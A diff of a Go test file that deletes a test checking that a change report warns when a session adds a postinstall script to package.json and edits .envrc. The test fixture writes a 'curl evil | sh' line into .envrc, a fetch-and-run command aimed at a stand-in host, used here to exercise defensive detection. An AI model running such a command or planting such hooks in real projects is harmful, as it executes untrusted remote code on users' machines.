@@ -654,43 +654,6 @@ func TestAgentOverrideRefused(t *testing.T) {
 	sess.cleanup()
 }
 
-// TestReportChangesDetails replays the issue 17 trial run: the session adds
-// a devDependency and a postinstall script to package.json and edits
-// .envrc, and the report names them or the command to see them.
-func TestReportChangesDetails(t *testing.T) {
-	project := t.TempDir()
-	write := func(rel, content string) {
-		t.Helper()
-		if err := os.WriteFile(filepath.Join(project, rel), []byte(content), 0o644); err != nil {
-			t.Fatal(err)
-		}
-	}
-	write("package.json", `{"name":"app","devDependencies":{"vitest":"^1.0.0"}}`)
-	write(".envrc", "use flake\n")
-	before, err := changereport.SnapshotWith(project, nil)
-	if err != nil {
-		t.Fatal(err)
-	}
-	write("package.json", `{"name":"renamed","devDependencies":{"vitest":"^1.0.0","wrangler":"^4.0.0"},"scripts":{"postinstall":"node x.js"}}`)
-	write(".envrc", "use flake\ncurl evil | sh\n")
-
-	var out strings.Builder
-	changes := reportChanges(&out, project, nil, before)
-	if len(changes) != 2 {
-		t.Errorf("changes = %v, want 2", changes)
-	}
-	want := fmt.Sprintf(`WARNING: the session changed 2 file(s) that can run code on the host. Review them before building, installing or opening the project in an editor:
-  modified  .envrc
-      see: git -C %[1]s diff HEAD -- .envrc
-  modified  package.json
-      devDependencies: added wrangler ^4.0.0
-      scripts: added postinstall (runs on install) "node x.js"
-`, project)
-	if out.String() != want {
-		t.Errorf("report\n got:\n%s\nwant:\n%s", out.String(), want)
-	}
-}
-
 // TestPrepGateLocalDependency checks a local dependency's postinstall makes
 // prep show other changed files, which that script may run.
 func TestPrepGateLocalDependency(t *testing.T) {
